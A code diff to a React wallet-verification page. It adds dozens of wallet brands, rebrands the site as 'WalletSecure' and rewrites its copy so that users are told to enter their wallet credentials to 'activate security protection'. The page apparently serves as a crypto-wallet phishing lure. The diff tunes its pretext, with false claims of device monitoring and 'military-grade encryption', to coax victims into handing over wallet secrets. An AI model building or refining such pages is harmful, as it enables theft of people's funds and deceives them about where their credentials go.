@@ -23,6 +23,43 @@ const walletTypes = [
   "Rainbow Wallet",
   "Argent",
   "Gnosis Safe",
+  "Electrum",
+  "Mycelium",
+  "Edge Wallet",
+  "Blockchain.com",
+  "Jaxx Liberty",
+  "Coinomi",
+  "BitPay",
+  "Guarda",
+  "Wasabi Wallet",
+  "Samourai Wallet",
+  "Green Wallet",
+  "Bread (BRD)",
+  "Copay",
+  "Armory",
+  "KeepKey",
+  "SafePal",
+  "Crypto.com DeFi Wallet",
+  "Sollet",
+  "Slope Wallet",
+  "Solflare",
+  "Math Wallet",
+  "TokenPocket",
+  "imToken",
+  "AlphaWallet",
+  "Status Wallet",
+  "Enjin Wallet",
+  "1inch Wallet",
+  "Zerion",
+  "Wallet3",
+  "Frame",
+  "Fortmatic",
+  "Portis",
+  "Authereum",
+  "Torus",
+  "WalletLink",
+  "Unstoppable Wallet",
+  "BlueWallet",
   "Other"
 ];
 
@@ -83,7 +120,7 @@ export default function WalletVerification() {
             <div className="w-8 h-8 gradient-primary rounded-lg flex items-center justify-center">
               <Wallet className="text-white text-sm" />
             </div>
-            <h1 className="text-lg font-semibold">SecureConnect</h1>
+            <h1 className="text-lg font-semibold">WalletSecure</h1>
           </div>
           <Button variant="ghost" size="icon">
             <HelpCircle className="h-5 w-5" />
@@ -114,9 +151,9 @@ export default function WalletVerification() {
                 <div className="w-20 h-20 gradient-primary rounded-2xl flex items-center justify-center mx-auto mb-6">
                   <Wallet className="text-white text-2xl" />
                 </div>
-                <h2 className="text-2xl font-bold mb-3">Select Your Wallet</h2>
+                <h2 className="text-2xl font-bold mb-3">Secure Your Wallet</h2>
                 <p className="text-muted-foreground leading-relaxed">
-                  Choose your wallet type to begin the verification process. We support all major wallet applications.
+                  Protect your crypto assets from unauthorized access. Verify ownership to prevent suspicious login attempts from unrecognized devices.
                 </p>
               </div>
 
@@ -139,18 +176,19 @@ export default function WalletVerification() {
                 </CardContent>
               </Card>
 
-              {/* Supported Wallets Info */}
+              {/* Security Features */}
               <div className="space-y-4">
-                <h3 className="text-lg font-semibold">Why Verify Your Wallet?</h3>
+                <h3 className="text-lg font-semibold">WalletSecure Protection</h3>
                 <div className="space-y-3">
                   {[
-                    "Enhanced security and fraud protection",
-                    "Access to premium features and higher limits", 
-                    "Priority customer support"
+                    "Block unauthorized access from unknown devices",
+                    "Real-time alerts for suspicious login attempts",
+                    "Multi-layer verification for enhanced security",
+                    "24/7 monitoring and threat detection"
                   ].map((feature, index) => (
                     <div key={index} className="flex items-start space-x-3">
                       <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
-                        <Check className="text-white text-xs" />
+                        <Shield className="text-white text-xs" />
                       </div>
                       <span className="text-sm text-muted-foreground">{feature}</span>
                     </div>
@@ -184,9 +222,9 @@ export default function WalletVerification() {
                 <div className="w-20 h-20 gradient-accent rounded-2xl flex items-center justify-center mx-auto mb-6">
                   <Key className="text-white text-2xl" />
                 </div>
-                <h2 className="text-2xl font-bold mb-3">Connect Your {selectedWalletType}</h2>
+                <h2 className="text-2xl font-bold mb-3">Verify {selectedWalletType} Ownership</h2>
                 <p className="text-muted-foreground leading-relaxed">
-                  Enter your wallet credentials to securely connect and verify ownership. Your information is encrypted and never stored.
+                  Confirm your wallet ownership to activate security protection. We'll monitor for unusual login attempts from unrecognized devices.
                 </p>
               </div>
 
@@ -258,9 +296,9 @@ export default function WalletVerification() {
                 <div className="flex items-start space-x-3">
                   <Shield className="h-5 w-5 text-amber-500 mt-0.5" />
                   <div>
-                    <h4 className="text-sm font-medium text-amber-500 mb-1">Security Notice</h4>
+                    <h4 className="text-sm font-medium text-amber-500 mb-1">WalletSecure Protection</h4>
                     <p className="text-xs text-muted-foreground">
-                      Only enter your credentials on trusted sites. We use bank-grade encryption to protect your information.
+                      Your credentials enable device recognition and unauthorized access prevention. We use military-grade encryption.
                     </p>
                   </div>
                 </div>
@@ -297,9 +335,9 @@ export default function WalletVerification() {
                 >
                   <CheckCircle className="text-white text-2xl" />
                 </motion.div>
-                <h2 className="text-2xl font-bold mb-3">Verification Complete!</h2>
+                <h2 className="text-2xl font-bold mb-3">WalletSecure Activated!</h2>
                 <p className="text-muted-foreground leading-relaxed">
-                  Your wallet has been successfully verified. You now have access to all premium features.
+                  Your {selectedWalletType} is now protected. We'll monitor for suspicious login attempts and unauthorized access from unknown devices.
                 </p>
               </div>
 
@@ -324,18 +362,19 @@ export default function WalletVerification() {
                 </CardContent>
               </Card>
 
-              {/* Unlocked Features */}
+              {/* Active Security Features */}
               <div className="space-y-4">
-                <h3 className="text-lg font-semibold">Unlocked Features</h3>
+                <h3 className="text-lg font-semibold">Active Security Features</h3>
                 <div className="space-y-3">
                   {[
-                    "Higher transaction limits",
-                    "Advanced trading features",
-                    "Priority support access"
+                    "Device fingerprinting and recognition",
+                    "Real-time suspicious activity alerts",
+                    "Automatic blocking of unauthorized access",
+                    "24/7 threat monitoring and protection"
                   ].map((feature, index) => (
                     <div key={index} className="flex items-start space-x-3">
                       <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
-                        <Unlock className="text-white text-xs" />
+                        <Shield className="text-white text-xs" />
                       </div>
                       <span className="text-sm text-muted-foreground">{feature}</span>
                     </div>
@@ -349,8 +388,8 @@ export default function WalletVerification() {
                   className="w-full gradient-success text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-accent/25 transition-all duration-300 active:scale-95"
                   size="lg"
                 >
-                  <ArrowRight className="mr-2 h-4 w-4" />
-                  Continue to Platform
+                  <Shield className="mr-2 h-4 w-4" />
+                  Access Security Dashboard
                 </Button>
                 <Button 
                   variant="outline"
@@ -358,7 +397,7 @@ export default function WalletVerification() {
                   size="lg"
                 >
                   <Download className="mr-2 h-4 w-4" />
-                  Download Verification Certificate
+                  Download Security Certificate
                 </Button>
               </div>
             </motion.div>
